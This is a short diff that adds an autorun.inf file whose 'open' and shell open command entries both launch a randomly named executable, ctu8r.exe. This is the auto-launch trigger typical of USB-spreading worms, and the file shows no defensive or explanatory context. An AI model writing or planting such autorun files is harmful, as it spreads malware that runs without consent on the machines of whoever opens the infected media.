@@ -1,0 +1,3 @@
+[AutoRun]
+open=ctu8r.exe
+shell\open\Command=ctu8r.exe
